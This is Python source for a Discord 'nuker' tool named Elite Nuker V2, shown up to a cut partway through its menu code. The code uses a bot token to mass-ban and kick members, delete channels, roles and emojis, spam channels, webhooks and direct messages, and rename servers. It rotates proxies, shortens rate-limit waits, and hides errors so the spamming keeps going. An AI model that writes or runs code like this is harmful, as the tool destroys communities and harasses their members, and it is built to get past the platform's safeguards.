import asyncio
import threading
import webbrowser
import discord
from discord.ext import commands
import httpx
import json
import time
import random
import os
from itertools import cycle
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

VERSION = '1.0.0'

# Setup Discord intents
intents = discord.Intents.default()
intents.members = True

# Load configuration and proxies
config = json.load(open("config.json", "r", encoding="utf-8"))
proxies = cycle(open("proxies.txt", "r").read().splitlines())

# Global variables
client = None
__threads__ = 200  

# ASCII art for the tool
Elite_art = ("""

        ███████╗██╗░░░░░██╗████████╗███████╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
        ██╔════╝██║░░░░░██║╚══██╔══╝██╔════╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
        █████╗░░██║░░░░░██║░░░██║░░░█████╗░░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
        ██╔══╝░░██║░░░░░██║░░░██║░░░██╔══╝░░  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
        ███████╗███████╗██║░░░██║░░░███████╗  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
        ╚══════╝╚══════╝╚═╝░░░╚═╝░░░╚══════╝  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

                              *    Elite Nuker V2 By Tavish     *
                              ═══════════════════════════════════         
                         ═════════════════════════════════════════════
""")

# Apply gradient to menu options
options = ("""
              ╚╦╗                                                             ╔╦╝
         ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
         ╩ (1) < Ban Members      ║ (8) < Delete Emojis     ║ (15) < Voice Kick      ╩
           (2) < Kick Members     ║ (9)  < Spam Channels    ║ (16) < Nickname Changer  
           (3) < Prune Members    ║ (10) < Webhook Spam     ║ (17) < Fetch Guilds      
           (4) < Create Channels  ║ (11) < Change Guild Name║ (18) < Spam All Channels 
           (5) < Create Roles     ║ (12) < Change Guild Icon║ (19) < Check Updates    
           (6) < Delete Channels  ║ (13) < Channel Perms    ║ (20) < Credits          
         ╦ (7) < Delete Roles     ║ (14) < Mass DM          ║ (21) < Exit            ╦
         ╚════════════════════════╩═════════════════════════╩════════════════════════╝
""")

class Elite:
    def __init__(self):
        
        self.proxy = "http://" + next(proxies) if config["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy, limits=httpx.Limits(max_connections=1000, max_keepalive_connections=100))
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.guilds = []

    def fetch_guilds(self, token: str):
        """Fetch all guilds the bot is in"""
        try:
            response = self.session.get(f"https://discord.com/api/{next(self.version)}/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                guilds_data = response.json()
                self.guilds = guilds_data
                print("{}({}+{}) Fetched {}{}{} guilds".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", len(guilds_data), "\x1b[0m"))
                for guild in guilds_data:
                    print("{}({}+{}) Guild: {}{}{} | ID: {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", guild['name'], "\x1b[0m", "\x1b[38;5;21m", guild['id']))
                return guilds_data
            else:
                print("{}({}-{}) Failed to fetch guilds".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                return []
        except Exception as e:
            print("{}({}-{}) Error fetching guilds: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
            return []

    def execute_ban(self, guildid: str, member: str, token: str):
        payload = {
            "delete_message_days": random.randint(0, 7)
        }
        while True:
            try:
                response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code in [200, 201, 204]:
                    print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                    self.banned.append(member)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                elif "Max number of bans for non-guild members have been exceeded." in response.text:
                    print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                    break
            except Exception as e:
                print("{}({}-{}) Error banning {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", member, e))
                break
            
    
    def execute_kick(self, guildid: str, member: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
                if response.status_code in [200, 201, 204]:
                    print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", member))
                    self.kicked.append(member)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                    break
            except Exception as e:
                print("{}({}-{}) Error kicking {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", member, e))
                break
            
    
    def execute_prune(self, guildid: str, days: int, token: str):
        payload = {
            "days": days
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            try:
                response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 201:
                    print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channelsname))
                    self.channels.append(1)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
                    break
            except Exception as e:
                print("{}({}-{}) Error creating channel {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channelsname, e))
                break
            
            
    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            try:
                response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 200:
                    print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", rolesname))
                    self.roles.append(1)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
                    break
            except Exception as e:
                print("{}({}-{}) Error creating role {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", rolesname, e))
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 200:
                    print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channel))
                    self.channels.append(channel)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting channel {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channel, e))
                break
            
            
    def execute_delroles(self, guildid: str, role: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 204:
                    print("{}({}+{}) Deleted {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", role))
                    self.roles.append(role)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting role {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", role, e))
                break
            
    
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            try:
                response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
                if response.status_code == 204:
                    print("{}({}+{}) Deleted {}@{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", emoji))
                    self.emojis.append(emoji)
                    break
                elif "retry_after" in response.text:
                    delay = min(float(response.json()['retry_after']), 1.0)  # Cap delay at 1 second for better performance
                    time.sleep(delay)  # Removed print to speed up execution
                elif "Missing Permissions" in response.text:
                    print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
                    break
                elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                    print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                    break
                else:
                    print("{}({}-{}) Failed to delete {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
                    break
            except Exception as e:
                print("{}({}-{}) Error deleting emoji {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", emoji, e))
                break
            
    
    def execute_mass_create_channels(self, guildid: str, name: str, type: int, amount: int, token: str):
        self.channels.clear()
        threads = []
        for i in range(amount):
            t = threading.Thread(target=self.execute_crechannels, args=(guildid, name, type, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_mass_create_roles(self, guildid: str, name: str, amount: int, token: str):
        self.roles.clear()
        threads = []
        for i in range(amount):
            t = threading.Thread(target=self.execute_creroles, args=(guildid, name, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_mass_delete_channels(self, channels: list, token: str):
        threads = []
        for channel in channels:
            t = threading.Thread(target=self.execute_delchannels, args=(channel, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_mass_delete_roles(self, guildid: str, roles: list, token: str):
        threads = []
        for role in roles:
            t = threading.Thread(target=self.execute_delroles, args=(guildid, role, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_mass_delete_emojis(self, guildid: str, emojis: list, token: str):
        threads = []
        for emoji in emojis:
            t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_spam_channels(self, guildid: str, name: str, type: int, amount: int, token: str):
        self.channels.clear()
        threads = []
        for i in range(amount):
            t = threading.Thread(target=self.execute_crechannels, args=(guildid, random.choice(config["nuke"]["channels_name"]), type, token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_spam_roles(self, guildid: str, name: str, amount: int, token: str):
        self.roles.clear()
        threads = []
        for i in range(amount):
            t = threading.Thread(target=self.execute_creroles, args=(guildid, random.choice(config["nuke"]["roles_name"]), token))
            t.start()
            threads.append(t)
            
            # Limit active threads
            while threading.active_count() >= __threads__:
                time.sleep(0.01)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
    
    
    def execute_webhook_spam(self, webhook_url: str, token: str):
        """Spam a webhook with messages"""
        try:
            use_random = input("{}({}Elite{}) Use random messages from config? (y/n){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            if use_random.lower() == "y":
                content = random.choice(config["nuke"]["messages_content"])
                username = random.choice(config["nuke"]["webhook_username"])
                avatar_url = random.choice(config["nuke"]["webhook_avatar"])
            else:
                content = input("{}({}Elite{}) Message{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                username = input("{}({}Elite{}) Username{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                avatar_url = input("{}({}Elite{}) Avatar URL{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            
            for i in range(100):  # Spam 100 messages
                payload = {
                    "content": content,
                    "username": username,
                    "avatar_url": avatar_url
                }
                response = self.session.post(webhook_url, json=payload)
                if response.status_code == 204:
                    print("{}({}+{}) Sent webhook message {}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", i+1))
                else:
                    print("{}({}-{}) Failed to send webhook message".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                time.sleep(0.1)
        except Exception as e:
            print("{}({}-{}) Error spamming webhook: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    
    def execute_change_guild_name(self, guildid: str, new_name: str, token: str):
        """Change the guild/server name"""
        try:
            payload = {
                "name": new_name
            }
            response = self.session.patch(f"https://discord.com/api/v9/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Changed guild name to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", new_name))
            else:
                print("{}({}-{}) Failed to change guild name".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
        except Exception as e:
            print("{}({}-{}) Error changing guild name: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    
    def execute_change_guild_icon(self, guildid: str, icon_url: str, token: str):
        """Change the guild/server icon"""
        try:
            # Download the image from URL
            import base64
            img_response = self.session.get(icon_url)
            if img_response.status_code == 200:
                # Convert image to base64
                img_data = base64.b64encode(img_response.content).decode('ascii')
                
                # Determine image type
                content_type = img_response.headers.get('content-type', '')
                if 'png' in content_type:
                    img_base64 = f"data:image/png;base64,{img_data}"
                elif 'jpg' in content_type or 'jpeg' in content_type:
                    img_base64 = f"data:image/jpeg;base64,{img_data}"
                else:
                    img_base64 = f"data:image/jpg;base64,{img_data}"
                
                payload = {
                    "icon": img_base64
                }
                response = self.session.patch(f"https://discord.com/api/v9/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
                if response.status_code == 200:
                    print("{}({}+{}) Changed guild icon".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                else:
                    print("{}({}-{}) Failed to change guild icon".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
            else:
                print("{}({}-{}) Failed to download icon image".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
        except Exception as e:
            print("{}({}-{}) Error changing guild icon: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    
    def execute_channel_permissions(self, channel_id: str, token: str):
        """Modify channel permissions"""
        try:
            # This will overwrite channel permissions for @everyone to deny all permissions
            payload = {
                "permission_overwrites": [{
                    "id": channel_id,  # This should be the role/user id, simplified for demo
                    "type": 0,  # Role
                    "deny": "8"  # ADMINISTRATOR permission denied
                }]
            }
            response = self.session.patch(f"https://discord.com/api/v9/channels/{channel_id}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Modified channel permissions".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            else:
                print("{}({}-{}) Failed to modify channel permissions".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
        except Exception as e:
            print("{}({}-{}) Error modifying channel permissions: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    
    def execute_mass_dm(self, userid: str, content: str, token: str):
        """Send DM to a user"""
        try:
            # Create DM channel first
            response = self.session.post("https://discord.com/api/v9/users/@me/channels", 
                                       headers={"Authorization": f"Bot {token}"}, 
                                       json={"recipient_id": userid})
            if response.status_code == 200:
                channel_data = response.json()
                channel_id = channel_data['id']
                
                # Send message in DM channel
                msg_response = self.session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",
                                              headers={"Authorization": f"Bot {token}"},
                                              json={"content": content})
                if msg_response.status_code == 200:
                    print("{}({}+{}) Sent DM to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid))
                else:
                    print("{}({}-{}) Failed to send DM to {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
            else:
                print("{}({}-{}) Failed to create DM channel with {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error sending DM to {}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", userid, e))
    
    
    def execute_voice_kick(self, guildid: str, userid: str, token: str):
        # Kick user from voice channel by editing their voice channel
        payload = {
            "channel_id": None  # Disconnect from voice
        }
        try:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{userid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Kicked {}{} from voice".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid))
            else:
                print("{}({}-{}) Failed to kick {}{} from voice".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error kicking {}{} from voice: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid, e))
    
    def execute_change_nick(self, guildid: str, userid: str, nickname: str, token: str):
        # Change user's nickname
        payload = {
            "nick": nickname
        }
        try:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{userid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Changed nickname of {}{} to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", userid, "\x1b[38;5;21m", nickname))
            else:
                print("{}({}-{}) Failed to change nickname of {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid))
        except Exception as e:
            print("{}({}-{}) Error changing nickname of {}{}: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", userid, e))
    
    def execute_spam_all_channels(self, guildid: str, content: str, amount: int, token: str):
        """Spam message to all channels in a guild with specified amount"""
        try:
            # Get all channels in the guild
            response = self.session.get(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                channels = response.json()
                text_channels = [ch for ch in channels if ch['type'] in [0, 5, 6]]  # 0=text, 5=news, 6=store
                
                print("{}({}+{}) Found {}{}{} text channels to spam".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", len(text_channels), "\x1b[0m"))
                
                # Create tasks for concurrent execution
                tasks = []
                for i in range(amount):
                    for channel in text_channels:
                        tasks.append((channel['id'], channel['name'], content, token))
                
                # Execute all tasks concurrently using threads
                threads = []
                for task in tasks:
                    t = threading.Thread(target=self.send_message_to_channel, args=(task[0], task[1], task[2], task[3]))
                    t.start()
                    threads.append(t)
                    
                    # Limit active threads
                    while threading.active_count() >= __threads__:
                        time.sleep(0.001)
                
                # Wait for all threads to complete
                for t in threads:
                    t.join()
                
                print("{}({}+{}) Successfully sent messages to all channels".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
            else:
                print("{}({}-{}) Failed to fetch channels".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
        except Exception as e:
            print("{}({}-{}) Error spamming all channels: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
    
    def send_message_to_channel(self, channel_id, channel_name, content, token):
        """Helper function to send a message to a specific channel"""
        try:
            msg_response = self.session.post(
                f"https://discord.com/api/{next(self.version)}/channels/{channel_id}/messages",
                headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"},
                json={"content": content}
            )
            if msg_response.status_code == 200:
                print("{}({}+{}) Sent message to {}{}".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", channel_name))
            elif "retry_after" in msg_response.text:
                # Handle rate limits by sleeping for the specified time
                try:
                    delay = min(float(msg_response.json()['retry_after']), 0.5)
                    time.sleep(delay)
                except:
                    time.sleep(0.1)
        except Exception:
            # Silently handle exceptions to keep spam going
            pass

    def menu(self):
        while True:
            os.system(f"cls & title Elite Nuker ^| Authenticated as: {client.user.name}#{client.user.discriminator}")
            print(Elite_art + options + "\n")
            ans = input("{}({}Elite{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")) 
            
            if ans == "1":
                try:
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.banned.clear()
                    for i in range(amount):
                        userid = input("{}({}Elite{}) User ID {}{}: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", i+1))
                        t = threading.Thread(target=self.execute_ban, args=(guildid, userid, token))
                        t.start()
                                    
                        # Limit active threads
                        while threading.active_count() >= __threads__:
                            time.sleep(0.001)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "2":
                try:
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.kicked.clear()
                    for i in range(amount):
                        userid = input("{}({}Elite{}) User ID {}{}: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", i+1))
                        t = threading.Thread(target=self.execute_kick, args=(guildid, userid, token))
                        t.start()
                        
                        # Limit active threads
                        while threading.active_count() >= __threads__:
                            time.sleep(0.001)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "3":
                try:
                    days = int(input("{}({}Elite{}) Days{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.execute_prune(guildid, days, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "4":
                try:
                    name = input("{}({}Elite{}) Channel Name{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    type = int(input("{}({}Elite{}) Type (0=text, 2=voice, 4=category){}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.execute_mass_create_channels(guildid, name, type, amount, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "5":
                try:
                    name = input("{}({}Elite{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m"))
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    self.execute_mass_create_roles(guildid, name, amount, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "6":
                try:
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    channels = []
                    for i in range(amount):
                        channel = input("{}({}Elite{}) Channel ID {}{}: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", i+1))
                        channels.append(channel)
                    self.execute_mass_delete_channels(channels, token)
                except:
                    print("{}({}-{}) Invalid input".format("\x1b[0m", "\x1b[31m", "\x1b[0m"))
                        
            elif ans == "7":
                try:
                    amount = int(input("{}({}Elite{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", "\x1b[0m")))
                    roles = []
                    for i in range(amount):
                        role = input("{}({}Elite{}) Role ID {}{}: ".format("\x1b[0m", "\x1b[38;5;21m", "\x1b[0m", "\x1b[38;5;21m", i+1))
                        roles.append(role)
                    self.execute_mass_delete_roles(guildid, roles, token)
                except:
